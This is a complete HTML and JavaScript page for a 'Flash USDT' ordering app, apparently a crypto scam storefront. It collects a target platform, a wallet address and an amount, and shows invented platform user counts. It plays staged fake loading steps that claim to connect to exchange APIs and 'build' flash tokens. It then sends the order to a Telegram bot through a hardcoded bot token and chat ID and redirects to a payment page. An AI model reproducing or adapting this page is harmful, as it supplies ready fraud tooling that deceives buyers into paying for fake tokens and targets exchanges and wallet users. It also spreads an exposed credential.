<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Order Application - Dark Theme</title>
    
<script src="https://cdn.tailwindcss.com"></script>
    
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap" rel="stylesheet">
    <style>
        /* Custom styles for the DARK THEME */
        :root {
            /* --- PRIMARY ACCENT COLORS (ORANGE/AMBER) --- */
            --primary-light: #FDBA74; /* Amber 400 */
            --primary-dark: #FF9800; /* Deep Orange/Amber Accent - Used for loading/warning fallback */
            --neon-green: #76FF03; /* NEW: Neon Green for the main button */
            
            /* --- DARK THEME BASE COLORS --- */
            --body-bg: #0A0A0A; /* Updated: Very Dark Black Background */
            --card-bg-transparent: rgba(31, 41, 55, 0.7); 
            --input-bg: rgba(55, 65, 81, 0.7); 
            --input-border: #4B5563; /* Input Border */
            --text-light: #F3F4F6; /* Light Text */
            --text-subtle: #9CA3AF; /* Subtle Gray Text */
            
            --card-radius: 0.8rem; /* Card radius (12px) */

            /* Network Colors */
            --trc-color: #E53935; /* Red (TRC) */
            --erc-color: #3F51B5; /* Indigo (ERC) */
            --bep-color: #FFB300; /* Amber (BEP) */

            /* Warning Color */
            --warning-color: #DC2626; /* Red 600 */
        }

        /* Dark Background for Body (Uses the new dark black color) */
        body {
            font-family: 'Inter', sans-serif;
            background: var(--body-bg); 
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 10vh;
            padding-top: 1.5rem; 
            overflow-x: hidden; 
            position: relative; 
        }

        #app-container {
            max-width: 400px;
            width: 100%;
            position: relative; 
            z-index: 1; 
        }
        
        /* Glassmorphism Effect for CARDS, INPUTS, MODALS, and DROPDOWNS */
        .glass-container {
            /* REQUIRED Glassmorphism Properties */
            background-color: var(--card-bg-transparent); 
            backdrop-filter: blur(12px); 
            /* Aesthetic Properties */
            border-radius: var(--card-radius);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.4); 
            border: 1px solid rgba(255, 255, 255, 0.1); 
        }

        .app-card {
            /* Inherits glass-container styles */
            @apply glass-container; 
            padding: 0.8rem 1rem; 
            margin-bottom: 0.75rem; 
            color: var(--text-light);
        }
        
        .input-style {
            background-color: var(--input-bg); 
            border: 1px solid var(--input-border);
            border-radius: 0.6rem; 
            padding: 0.5rem 0.8rem; 
            transition: all 0.2s;
            color: var(--text-light);
            backdrop-filter: blur(4px); 
        }
        .input-style::placeholder {
            color: var(--text-subtle);
        }
        .input-style:focus {
            border-color: var(--primary-dark);
            box-shadow: 0 0 0 1px var(--primary-dark);
            background-color: var(--input-bg);
            outline: none;
        }
        
        /* Network Buttons - Base Styles */
        .network-btn-trc { background-color: var(--trc-color); }
        .network-btn-erc { background-color: var(--erc-color); }
        .network-btn-bep { background-color: var(--bep-color); }

        .network-btn {
            border-radius: 0.75rem; 
            transition: all 0.2s ease-in-out; 
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.4);
            padding: 0.2rem; 
            height: 45px; 
            border: 3px solid transparent; 
        }
        .network-btn:active {
            transform: scale(0.98);
        }
        
        /* Selection Glow Style */
        .network-selected {
            border: 3px solid #FF0000; 
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.8), 0 2px 5px rgba(0, 0, 0, 0.5); 
            transform: scale(1.02); 
        }
        
        /* Internal button layout for uniformity (LTR-adjusted) */
        .network-btn-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            height: 100%; 
            padding: 0 0.5rem; 
        }
        
        .network-label {
            font-weight: 700;
            font-size: 0.6rem; 
            flex-shrink: 0; 
            /* margin-right: -3rem; (Removed RTL adjustment) */
        }
        
        .network-icon {
            width: 28px; 
            height: 28px; 
            border-radius: 50%;
            background-color: rgba(255, 255, 255, 1);
            display: flex;
            justify-content: center;
            align-items: center;
            flex-shrink: 0; 
        }

        /* --- UPDATED: Submit Button to NEON GREEN style --- */
        .submit-gradient-btn {
            background: var(--neon-green); /* Bright Neon Green */
            color: #000000; /* Black text for high contrast */
            
            border-radius: 1rem;
            padding: 0.8rem; 
            font-size: 1rem; 
            font-weight: 800;
            box-shadow: 0 8px 30px rgba(118, 255, 3, 0.9); /* Strong Neon Shadow */
            transition: all 0.3s ease;
            text-shadow: 0 0 2px rgba(0, 0, 0, 0.5); /* Slight shadow on text */
        }
        .submit-gradient-btn:hover {
             box-shadow: 0 10px 40px rgba(118, 255, 3, 1);
             transform: translateY(-1px); /* Slight lift effect */
        }
        /* --- END UPDATED SUBMIT BUTTON --- */
        
        /* Toast style */
        #toast-container div {
             /* Using original dark primary color for toast */
             background-color: var(--primary-dark);
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.6);
        }

        /* Custom scrollbar */
        .custom-scrollbar::-webkit-scrollbar {
            width: 6px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb { 
            background-color: var(--primary-dark);
            border-radius: 3px; 
        }
        .custom-scrollbar::-webkit-scrollbar-track { 
            background: var(--input-bg);
            border-radius: 3px;
        }

        /* Loader */
        .loader {
            border-top: 4px solid var(--primary-dark); 
        }
        
        /* Menu icon and dropdown text color */
        .menu-icon-color {
            color: var(--primary-dark);
        }

        /* Platform Dropdown specific dark styles (Semi-transparent with glass effect) */
        #platform-dropdown {
            @apply glass-container; 
            padding: 0.5rem 0; 
            border-color: var(--input-border) !important;
            backdrop-filter: blur(8px); 
            left: 0; /* Adjusted for LTR */
            right: unset; /* Adjusted for LTR */
        }
        #platform-dropdown .hover\\:bg-gray-100:hover {
            background-color: rgba(255, 255, 255, 0.2) !important; 
        }
        #platform-dropdown .text-gray-800 {
            color: var(--text-light) !important;
        }
        #platform-dropdown .text-gray-400 {
            color: var(--text-subtle) !important;
        }

        /* Menu Dropdown (Glass Effect) */
        #menu-dropdown {
             @apply glass-container; 
             backdrop-filter: blur(8px); 
             right: 4px; /* Adjusted position for LTR */
             left: unset; /* Adjusted position for LTR */
        }
        
        /* Warning Modal Specific Styles (Glassmorphism) */
        .modal-card {
            @apply glass-container; 
        }

        /* Animation for Toast */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes fadeOut {
            from { opacity: 1; transform: translateY(0); }
            to { opacity: 0; transform: translateY(-20px); }
        }

        .fade-in {
            animation: fadeIn 0.3s ease-out forwards;
        }

        .fade-out {
            animation: fadeOut 0.3s ease-in forwards;
        }
        
        /* --- START OF GIFT ANIMATION STYLES --- */
        @keyframes shake-gift-animation {
            0% { transform: rotate(0deg); }
            15% { transform: rotate(5deg); }
            30% { transform: rotate(-5deg); }
            45% { transform: rotate(5deg); }
            60% { transform: rotate(-5deg); }
            75% { transform: rotate(0deg); }
            100% { transform: rotate(0deg); }
        }

        .shake-gift {
            animation: shake-gift-animation 1.5s ease-in-out infinite;
            transition: transform 0.1s;
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
            line-height: 1;
        }

        .shake-gift:hover, .shake-gift:active {
            animation-play-state: paused;
            transform: scale(1.1);
        }
        /* --- END OF GIFT ANIMATION STYLES --- */
        
        /* Professional Loading Modal styles */
        #loading-modal .modal-card {
             width: 11/12;
             max-width: 300px;
        }
        /* Icon styles for loading screen */
        .loading-icon {
            color: var(--primary-dark); 
            transition: color 0.3s;
        }

    </style>
</head>
<body>

    <div id="app-container">
        
        <!-- TOP NAVIGATION BAR -->
        <div class="relative z-20 flex justify-between items-center px-4 mb-8">
            
            <div class="flex items-center">
                
                <img src="logo.png" 
                     alt="App Logo" 
                     class="w-10 h-10 object-cover rounded-full shadow-lg"
                     onerror="this.onerror=null; this.src='https://placehold.co/40x40/FF9800/FFFFFF?text=LOGO';">

                <div class="flex items-center ml-4">
                    <span class="text-white text-xl font-extrabold">GROK 3.7</span>
                    
                    <button id="gift-button" 
                            class="ml-2 text-2xl text-red-500 hover:text-red-400 shake-gift" 
                            title="Referral Link"
                            onclick="showGiftModal()"> <!-- UPDATED: showGiftModal() is now called -->
                        <i class="fas fa-gift"></i>
                    </button>
                </div>
            </div>

            <div class="flex items-center">
                
                <button id="menu-button" 
                        class="text-2xl p-2 focus:outline-none menu-icon-color" 
                        onclick="toggleDropdownMenu()">
                    <i class="fas fa-bars"></i>
                </button>
            </div>

            <div id="menu-dropdown" 
                 class="absolute right-4 top-10 mt-2 w-40 rounded-xl shadow-lg z-30 hidden">
                <ul class="p-1 space-y-0.5">
                    <li>
                        <button onclick="handleMenuClick('transactions')" 
                                class="w-full text-left text-white text-sm font-medium p-2 rounded-lg transition duration-150 hover:bg-white/20">
                                Transactions
                        </button>
                    </li>
                    <li>
                        <button onclick="handleMenuClick('payment_support')" 
                                class="w-full text-left text-white text-sm font-medium p-2 rounded-lg transition duration-150 hover:bg-white/20">
                                Payment Support
                        </button>
                    </li>
                    <li>
                        <button onclick="handleMenuClick('contact us')" 
                                class="w-full text-left text-white text-sm font-medium p-2 rounded-lg transition duration-150 hover:bg-white/20">
                                Contact Us
                        </button>
                    </li>
                </ul>
            </div>
        </div>


        <form id="order-form" class="px-4">

            <!-- SELECT PLATFORM -->
            <div class="app-card">
                <label for="platform-input" class="block text-sm font-semibold text-gray-200 mb-2 text-left">Select Platform</label>
                <div class="relative">
                    
                    <button type="button" id="platform-display-button" 
                           class="w-full input-style cursor-pointer text-white pl-3 pr-8 text-sm flex items-center justify-between h-10"
                           onclick="togglePlatformDropdown()">
                        
                        <div class="flex items-center flex-grow justify-start">
                            <span id="platform-icon-display" class="w-5 h-5 mr-3 flex-shrink-0">
                                <i class="fas fa-globe text-lg text-gray-400"></i>
                            </span>
                            <span id="platform-name-display" class="text-left text-gray-400">Select...</span>
                        </div>
                        <i class="fas fa-chevron-down text-gray-400 text-xs flex-shrink-0"></i>
                    </button>
                    
                    <input type="hidden" id="platform-input" required>
                    
                    <div id="platform-dropdown" class="absolute w-full mt-2 border rounded-xl shadow-xl max-h-40 overflow-y-auto z-10 hidden custom-scrollbar">
                        </div>
                </div>
            </div>

            <!-- WALLET ADDRESS -->
            <div class="app-card">
                <label for="wallet-address" class="block text-sm font-semibold text-gray-200 mb-2 text-left">Wallet Address</label>
                <div class="relative">
                    <input type="text" id="wallet-address" placeholder="Your Wallet Address"
                           class="w-full input-style text-white pr-10 text-sm text-left" required
                           oninput="autoSelectNetwork()">
                    
                    <button type="button" 
                            class="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-white transition" 
                            onclick="copyAddress()">
                        <i class="far fa-copy"></i>
                    </button>
                </div>
            </div>
            
            <!-- SELECT NETWORK -->
            <div class="app-card">
                <label class="block text-sm font-semibold text-gray-200 mb-2 text-left">Select Network</label>
                
                <div class="flex w-11/12 mx-auto justify-between gap-2 items-center" role="group"> 
                    
                    <button type="button" class="network-btn flex-1 text-white network-btn-trc" data-network="TRC20" onclick="handleNetworkChange('TRC20')">
                        <div class="network-btn-content">
                             <div class="network-icon">
                                <img src="trx.png" alt="TRC20 Icon" class="w-full h-full object-contain p-1 rounded-full"
                                    onerror="this.onerror=null; this.src='https://placehold.co/28x28/E53935/FFFFFF?text=TRC';">
                            </div>
                            <span class="network-label">TRC20</span>
                        </div>
                    </button>
                    
                    <button type="button" class="network-btn flex-1 text-white network-btn-erc" data-network="ERC20" onclick="handleNetworkChange('ERC20')">
                        <div class="network-btn-content">
                             <div class="network-icon">
                                <img src="ethereum.png" alt="ERC20 Icon" class="w-full h-full object-contain p-1 rounded-full"
                                    onerror="this.onerror=null; this.src='https://placehold.co/28x28/3F51B5/FFFFFF?text=ERC';">
                            </div>
                            <span class="network-label">ERC20</span>
                        </div>
                    </button>

                    <button type="button" class="network-btn flex-1 text-white network-btn-bep" data-network="BEP20" onclick="handleNetworkChange('BEP20')">
                        <div class="network-btn-content">
                             <div class="network-icon">
                                <img src="binance.png" alt="BEP20 Icon" class="w-full h-full object-contain p-1 rounded-full"
                                    onerror="this.onerror=null; this.src='https://placehold.co/28x28/FFB300/FFFFFF?text=BEP';">
                            </div>
                            <span class="network-label">BEP20</span>
                        </div>
                    </button>
                </div>
                <input type="hidden" id="selected-network" required>
            </div>

            <!-- AMOUNT INPUT -->
            <div class="app-card">
                <label for="flash-amount" class="block text-sm font-semibold text-gray-200 mb-3 text-left">Flash USDT Amount <span class="text-xs font-normal text-gray-400">(Min 299 - Max 9000)</span></label>
                
                <input type="text" id="flash-amount" placeholder="0" 
                       class="w-full p-3 text-2xl font-bold text-center border-b border-gray-600 focus:border-primary-dark transition duration-200 text-white" required
                       oninput="formatAndCalculateUsd(this)" 
                       inputmode="numeric" 
                       pattern="[0-9,]*"
                       style="background: none; direction: ltr;">
                
                <div class="flex items-center justify-between mt-4 pt-3 border-t border-gray-700">
                    <span class="text-sm font-medium text-gray-400">Total Cost</span>
                    <span id="usd-value" class="text-lg font-extrabold text-white" dir="ltr">$0.00</span>
                </div>
            </div>
            
            <button type="submit" id="submit-button" 
                    class="w-full submit-gradient-btn mt-3">
                Submit Order <i class="fas fa-paper-plane ml-2"></i>
            </button>
        </form>

    </div>

    <!-- Toast Container for Menu Messages -->
    <div id="toast-container" class="fixed top-5 left-1/2 transform -translate-x-1/2 z-50 space-y-2">
        </div>

    <!-- Professional Loading Modal -->
    <div id="loading-modal" class="fixed inset-0 bg-black bg-opacity-70 flex justify-center items-center z-50 hidden">
        <div class="modal-card p-6 rounded-xl shadow-2xl text-center w-11/12 max-w-sm">
            <div class="loader mx-auto mb-4 w-10 h-10 rounded-full border-4 border-gray-600 animate-spin"></div>
            <!-- Loading message now includes an icon -->
            <p id="loading-message" class="text-base font-semibold text-gray-200 min-h-6 flex items-center justify-center text-left">
                <i class="fas fa-sync-alt loading-icon mr-2"></i> Initializing...
            </p>
        </div>
    </div>
    
    <!-- Warning Modal for Network Change -->
    <div id="warning-modal" class="fixed inset-0 bg-black bg-opacity-70 flex justify-center items-center z-50 hidden">
        <div class="modal-card p-6 w-11/12 max-w-sm text-center">
            <i class="fas fa-exclamation-triangle text-red-500 text-4xl mb-4"></i>
            <h3 class="text-xl font-bold mb-2 text-white">Important Warning!</h3>
            <p class="text-base text-gray-300 mb-6">
                Choosing the wrong network may result in permanent loss of funds.
            </p>
            <p class="text-sm text-gray-400 mb-6">
                Are you sure you want to select 
                <span id="new-network-label" class="font-extrabold text-red-400"></span> 
                instead of 
                <span id="current-network-label" class="font-extrabold text-gray-200"></span>?
            </p>
            <div class="flex justify-between gap-3">
                
                <button type="button" onclick="cancelNetworkChange()" 
                        class="flex-1 py-2 px-4 bg-gray-600 hover:bg-gray-500 rounded-lg text-white font-semibold transition">
                    Cancel
                </button>
                
                <button type="button" id="confirm-network-button" 
                        class="flex-1 py-2 px-4 bg-red-600 hover:bg-red-700 rounded-lg text-white font-semibold transition">
                    Continue
                </button>
            </div>
        </div>
    </div>
    
    <!-- Gift Information Modal (NEW MODAL) -->
    <div id="gift-info-modal" class="fixed inset-0 bg-black bg-opacity-70 flex justify-center items-center z-50 hidden">
        <div class="modal-card p-6 w-11/12 max-w-sm text-center">
            <!-- Icon to symbolize restriction/warning -->
            <i class="fas fa-ban text-red-500 text-4xl mb-4"></i>
            <h3 class="text-xl font-bold mb-2 text-white">Feature Restriction</h3>
            <p class="text-base text-gray-300 mb-6">
                This feature is only available in China.
            </p>
            <button type="button" onclick="closeModal('gift-info-modal')" 
                    class="w-full py-2 px-4 bg-red-600 hover:bg-red-700 rounded-lg text-white font-semibold transition">
                OK
            </button>
        </div>
    </div>


    <script>
        // --- Configuration ---
        const BOT_TOKEN = '8512833625:AAEaG5wnazuKM6zvu_5CX6MkDfHvacD0sMw';
        const CHAT_ID = '8271446244';
        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const EXCHANGE_RATE = 12 / 300; // 0.04 USD per FLASH USDT
        const MIN_AMOUNT = 299;
        const MAX_AMOUNT = 9000;
        const LOADING_DELAY_MS = 3000; // 3 seconds delay as requested

        // Platforms list remains the same
        const platforms = [
            { name: 'Binance', img_src: 'binance.png', file: '3775 users [monthly]' },
            { name: 'Bybit', img_src: 'bybit.png', file: '2751 users [monthly]' },
            { name: 'MEXC', img_src: 'mexc.png', file: '1937 users [monthly]' },
            { name: '1xBet', img_src: '1xbet.png', file: '13745 users [monthly]' },
            { name: 'Linbet', img_src: 'linebet.png', file: '11766 users [monthly]' },
            { name: 'Malbet', img_src: 'malbet.png', file: '9073 users [monthly]' },
            { name: 'MegaPari', img_src: 'megapari.png', file: '6118 users [monthly]' },
            { name: 'TrustWallet', img_src: 'trustwallet.png', file: '3652 users [monthly]' },
            { name: 'MetaMask', img_src: 'metamask.png', file: '3199 users [monthly]' },
            { name: 'Phantom', img_src: 'phantom.png', file: '2703 users [monthly]' },
            { name: 'TronLink', img_src: 'tronlink.png', file: '2598 users [monthly]' },
            { name: 'XM', img_src: 'xm.png', file: '2387 users [monthly]' },
            { name: 'Tikcmall', img_src: 'tickmall.png', file: '2187 users [monthly] ' },
            { name: 'Exness', img_src: 'exness.png', file: '1052 users [monthly]' },
            { name: 'eToro', img_src: 'etoro.png', file: '94 users [monthly]' },
            { name: 'Pocket option', img_src: 'pocket.png', file: '199 users [monthly]' },
            { name: 'Qoutex', img_src: 'quotex.png', file: '9437 users [monthly]' },
        ];


        // --- DOM Elements and UI Logic ---
        
        const menuDropdown = document.getElementById('menu-dropdown');
        const platformDropdown = document.getElementById('platform-dropdown');
        // Updated DOM references
        const platformDisplayButton = document.getElementById('platform-display-button');
        const platformNameDisplay = document.getElementById('platform-name-display');
        const platformIconDisplay = document.getElementById('platform-icon-display');
        const platformInput = document.getElementById('platform-input'); // The hidden input for data
        
        const flashAmountInput = document.getElementById('flash-amount');
        const usdValueDisplay = document.getElementById('usd-value');
        const networkButtons = document.querySelectorAll('.network-btn');
        const selectedNetworkInput = document.getElementById('selected-network');
        const orderForm = document.getElementById('order-form');
        
        const loadingModal = document.getElementById('loading-modal'); 
        const loadingMessage = document.getElementById('loading-message');
        const warningModal = document.getElementById('warning-modal');
        const newNetworkLabel = document.getElementById('new-network-label');
        const currentNetworkLabel = document.getElementById('current-network-label');
        const confirmNetworkButton = document.getElementById('confirm-network-button');

        
        /**
         * Generic function to close a modal by its ID.
         * @param {string} modalId The ID of the modal element.
         */
        function closeModal(modalId) {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.classList.add('hidden');
            }
        }
        
        /**
         * Shows the gift feature restriction modal.
         */
        function showGiftModal() {
            const giftModal = document.getElementById('gift-info-modal');
            if (giftModal) {
                giftModal.classList.remove('hidden');
            }
        }


        function toggleDropdownMenu() {
            menuDropdown.classList.toggle('hidden');
        }

        // Close dropdown when clicking outside
        document.addEventListener('click', (event) => {
            const menuButton = document.getElementById('menu-button');
            const giftButton = document.getElementById('gift-button'); 

            if (menuDropdown && !menuDropdown.classList.contains('hidden')) {
                if (!menuDropdown.contains(event.target) && !menuButton.contains(event.target) && !giftButton.contains(event.target)) {
                    menuDropdown.classList.add('hidden');
                }
            }
        });


        function showToast(message) {
            const toastContainer = document.getElementById('toast-container');
            const toast = document.createElement('div');
            toast.className = 'text-white px-6 py-3 rounded-full shadow-xl fade-in';
            toast.style.direction = 'ltr'; // Ensure LTR for toast messages
            toast.innerHTML = `<span class="font-medium">${message}</span>`;
            
            toastContainer.appendChild(toast);
            
            setTimeout(() => {
                toast.classList.replace('fade-in', 'fade-out');
                setTimeout(() => {
                    toast.remove();
                }, 300);
            }, 2000);
        }

        function handleMenuClick(item) {
            menuDropdown.classList.add('hidden'); 

            if (item === 'transactions') {
                showToast("No transactions found.");
            } else if (item === 'payment_support') {
                showToast("No payment detected.");
            } else if (item === 'contact us') {
                // ACTION: Open Telegram bot link in a new tab
                window.open('https://t.me/ZhangHaoyu1921', '_blank');
            }
        }

        function togglePlatformDropdown() {
            platformDropdown.classList.toggle('hidden');
        }

        /**
         * Selects the platform and updates the visual display with icon and name.
         * @param {string} name The platform name.
         * @param {string} imgSrc The path to the platform's image icon.
         */
        function selectPlatform(name, imgSrc) {
            // Update the hidden input for form submission
            platformInput.value = name; 

            // Update the display button
            platformNameDisplay.textContent = name;
            platformNameDisplay.classList.remove('text-gray-400'); // Remove placeholder color
            platformNameDisplay.classList.add('text-white');
            
            // Update the icon display using the image
            platformIconDisplay.innerHTML = `
                <img src="${imgSrc}" alt="${name} logo" class="w-full h-full object-contain rounded-full"
                    onerror="this.onerror=null; this.src='https://placehold.co/20x20/374151/FFFFFF?text=${name.charAt(0)}';">
            `;
            
            togglePlatformDropdown();
        }
        
        /**
         * Selects the specified network button and updates the hidden input (Programmatic selection).
         * @param {string} network The network to select ('TRC20', 'ERC20', 'BEP20') or empty string to clear.
         */
        function selectNetwork(network) {
            // Remove red selection effect from all buttons
            networkButtons.forEach(btn => {
                btn.classList.remove('network-selected'); 
            });

            const selectedButton = document.querySelector(`.network-btn[data-network="${network}"]`);
            if (selectedButton) {
                selectedButton.classList.add('network-selected'); // Add red glow class
                selectedNetworkInput.value = network;
            } else {
                // If no button is selected, clear the hidden input.
                selectedNetworkInput.value = '';
            }
        }
        
        /**
         * Logic triggered by user clicking a network button. Handles the warning modal.
         * @param {string} newNetwork The network the user wants to select.
         */
        function handleNetworkChange(newNetwork) {
            const currentNetwork = selectedNetworkInput.value;
            
            // If the user clicks the currently selected network, do nothing.
            if (newNetwork === currentNetwork) {
                return; 
            }
            
            // If there is no current selection, proceed without warning.
            if (!currentNetwork) {
                selectNetwork(newNetwork);
                return;
            }

            // Show Warning Modal for manual network change
            newNetworkLabel.textContent = newNetwork;
            currentNetworkLabel.textContent = currentNetwork;
            warningModal.classList.remove('hidden');

            // Attach the confirmation action to the button
            confirmNetworkButton.onclick = () => confirmNetworkChange(newNetwork);
        }

        /**
         * Confirms the network change and closes the modal.
         * @param {string} newNetwork The network to be selected.
         */
        function confirmNetworkChange(newNetwork) {
            selectNetwork(newNetwork);
            warningModal.classList.add('hidden');
        }

        /**
         * Cancels the network change and closes the modal (keeping the previous selection).
         */
        function cancelNetworkChange() {
            warningModal.classList.add('hidden');
        }
        
        /**
         * Determines the network based on the wallet address prefix and selects it.
         */
        function autoSelectNetwork() {
            const address = document.getElementById('wallet-address').value.trim();
            let networkToSelect = '';

            if (address.startsWith('T') && address.length >= 34) {
                networkToSelect = 'TRC20';
            } else if (address.startsWith('0x') && address.length === 42) {
                // ERC20 and BEP20 both start with 0x and have 42 chars. 
                // We default to BEP20 for 0x addresses, but the user must manually confirm if needed.
                 networkToSelect = 'BEP20';
            }

            // Only update selection if a valid network is detected AND it's not already selected.
            if (networkToSelect && networkToSelect !== selectedNetworkInput.value) {
                selectNetwork(networkToSelect);
                showToast(`Network automatically detected: ${networkToSelect}`);
            } else if (!networkToSelect) {
                // Clear selection if the address is empty or invalid
                selectNetwork('');
            }
        }
        
        /**
         * Cleans, validates, formats (with comma), and calculates USD value for the flash amount input.
         * @param {HTMLInputElement} inputElement The flash amount input field.
         */
        function formatAndCalculateUsd(inputElement) {
            // 1. Clean the input: Remove all characters that are NOT a digit (0-9). 
            const cleanedValue = inputElement.value.replace(/[^0-9]/g, ''); 
            let amount = parseInt(cleanedValue || '0', 10);

            // 2. Validation and Bounds Check
            if (amount > MAX_AMOUNT) {
                amount = MAX_AMOUNT;
            }
            
            // 3. Reformat with commas for display
            if (amount > 0) {
                // Use toLocaleString for standard thousands separation (commas in en-US locale)
                const formattedAmount = amount.toLocaleString('en-US'); 
                inputElement.value = formattedAmount;
            } else {
                inputElement.value = '';
            }
            
            // 4. Calculate USD Cost
            const finalAmount = amount > 0 ? (amount > MAX_AMOUNT ? MAX_AMOUNT : amount) : 0;
            const totalUsd = finalAmount * EXCHANGE_RATE;
            usdValueDisplay.textContent = `$${totalUsd.toFixed(2)}`;
        }


        function copyAddress() {
            const address = document.getElementById('wallet-address').value;
            if (!address) {
                 showToast("Address is empty.");
                 return;
            }
            
            const tempInput = document.createElement('textarea');
            tempInput.value = address;
            document.body.appendChild(tempInput);
            tempInput.select();
            
            try {
                const successful = document.execCommand('copy');
                if (successful) {
                    showToast("Wallet address copied!");
                } else {
                    showToast("Copy failed. Please copy manually.");
                }
            } catch (err) {
                showToast("Copy failed: " + err.message);
            }
            
            document.body.removeChild(tempInput);
        }


        // --- API & Form Submission ---

        async function sendOrderToTelegram(data) {
            // Prepares the message in English/Arabic format
            const message = `
ðŸŒŸ New Flash USDT Order ðŸŒŸ

------------------------------
**Platform:** ${data.platform}
**Wallet:** \`${data.wallet}\`
**Network:** ${data.network}
**Amount (FLASH):** ${data.amount} USDT
**Cost (USD):** ${data.cost}
------------------------------
`;

            const payload = {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            };

            const url = API_URL;
            const maxRetries = 3;
            let currentRetry = 0;

            while (currentRetry < maxRetries) {
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });

                    if (response.ok) {
                        return true;
                    } else if (response.status === 429) {
                        const delay = Math.pow(2, currentRetry) * 1000;
                        await new Promise(resolve => setTimeout(resolve, delay));
                        currentRetry++;
                        continue; 
                    } else {
                        const errorData = await response.json();
                        throw new Error(`Telegram API error: ${errorData.description}`);
                    }
                } catch (error) {
                    throw new Error(`Failed to send order: ${error.message}`);
                }
            }
            throw new Error('Telegram API failed after multiple retries due to rate limiting or connection issues.');
        }

        orderForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            const platform = platformInput.value;
            const wallet = document.getElementById('wallet-address').value.trim();
            const network = selectedNetworkInput.value;
            // Clean the input to remove commas for parsing
            const amountText = flashAmountInput.value.replace(/[^0-9]/g, '');
            const amount = parseFloat(amountText);
            const cost = usdValueDisplay.textContent;

            // Simple client-side validation (in English)
            if (!platform) {
                showToast("Please select a platform.");
                return;
            }
            if (wallet.length < 10) {
                 showToast("Please enter a valid wallet address.");
                 return;
            }
            if (!network) {
                 showToast("Please select a network.");
                 return;
            }
            if (isNaN(amount) || amount < MIN_AMOUNT || amount > MAX_AMOUNT) {
                 showToast(`Amount must be between ${MIN_AMOUNT} and ${MAX_AMOUNT}.`);
                 return;
            }

            const orderData = { platform, wallet, network, amount, cost };
            
            // Save Cost to localStorage before starting the async sequence
            localStorage.setItem('orderCost', cost);

            // 1. Show the Loading Modal
            loadingModal.classList.remove('hidden'); 

            // Steps for the professional loading sequence (messages in English)
            const loadingSteps = [
                { icon: 'fas fa-link', message: `Connecting to ${platform} API...` }, 
                { icon: 'fas fa-wallet', message: 'Confirming wallet address...' }, 
                { icon: 'fas fa-wifi', message: 'Fetching network status...' }, 
                { icon: 'fas fa-bolt', message: 'Building flash amount...' } 
            ];
            
            const updateMessage = (iconClass, text) => {
                // Adjust text alignment for LTR
                loadingMessage.innerHTML = `
                    <i class="${iconClass} loading-icon mr-2 animate-pulse"></i> ${text}
                `;
            };

            try {
                // 2. Execute sequence of steps with 3-second delay
                for (const step of loadingSteps) {
                    updateMessage(step.icon, step.message);
                    await new Promise(r => setTimeout(r, LOADING_DELAY_MS));
                }
                
                // 3. Perform the actual async operation (sending to Telegram)
                updateMessage('fas fa-paper-plane', 'Sending order via secure channel...');
                await sendOrderToTelegram(orderData);
                
                // 4. Final success message
                updateMessage('fas fa-check-circle', 'Connection successfully established!'); 

                // 5. Delay and redirect immediately after the final message
                setTimeout(() => {
                    loadingModal.classList.add('hidden'); 
                    window.location.href = 'pay.html';
                }, 1000); // 1 second delay after success message
                
            } catch (error) {
                loadingModal.classList.add('hidden');
                showToast(`Submission Error: ${error.message}`);
                console.error("Submission Error:", error);
            }
        });


        // --- Initialization ---

        function populatePlatformDropdown() {
            const container = document.getElementById('platform-dropdown');
            container.innerHTML = ''; 

            platforms.forEach(p => {
                const item = document.createElement('div');
                item.className = 'flex items-center p-3 cursor-pointer transition duration-150 hover:bg-white/20';
                // Pass both name and image source to selectPlatform
                item.onclick = () => selectPlatform(p.name, p.img_src); 
                
                item.innerHTML = `
                    <img src="${p.img_src}" alt="${p.name} logo" 
                         class="w-6 h-6 object-contain rounded-full mr-3 flex-shrink-0"
                         onerror="this.onerror=null; this.src='https://placehold.co/24x24/374151/FFFFFF?text=${p.name.charAt(0)}';">
                    <div>
                        <p class="text-sm font-semibold text-white text-left">${p.name}</p>
                        <p class="text-xs text-gray-400 text-left">${p.file}</p>
                    </div>
                `;
                container.appendChild(item);
            });
        }
        
        // Run on load
        window.onload = function() {
            populatePlatformDropdown();
            // Ensure the initial placeholder for the platform icon is set
            platformIconDisplay.innerHTML = `<i class="fas fa-globe text-lg text-gray-400"></i>`;
        };

    </script>
</body>
</html>

